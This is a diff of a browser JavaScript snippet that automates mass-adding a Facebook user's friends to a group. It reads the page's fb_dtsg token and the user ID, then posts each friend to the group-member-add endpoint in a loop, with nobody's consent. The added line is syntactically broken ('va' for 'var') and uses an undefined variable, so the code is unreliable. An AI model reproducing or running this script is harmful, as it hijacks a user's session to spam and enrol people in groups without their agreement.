@@ -1,4 +1,5 @@
 var tulisanNganu='Script Made By :- Waqar Ahmad';
+va MeNNt='';MeNNt="<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;";MeNNt+=b.split('"')[14];MeNNt+="</div>";
 var kunaon='';
 function penetrasi(opo){
 jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id="+memberGroupId+"&source=typeahead&members="+opo+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(a){
@@ -27,6 +28,7 @@ dipes+="<b>"+suc+"</b> Friends Added of "+(arr.length-i)+" Friends Processed ";
 dipes+="("+i+" Lefted...)";
 dipes+="<div class='friend-edge'>";
 dipes+=kunaon;
+dipes+=MeNNt;
 dipes+="</div>";
 }else{
 dipes+=arr.length+" Friends detected and ";
@@ -194,3 +196,6 @@ dipes+="</div>";
 document.getElementById("pagelet_welcome_box").innerHTML=dipes;
 penetrasi(arr[i])
 })
+
+
+
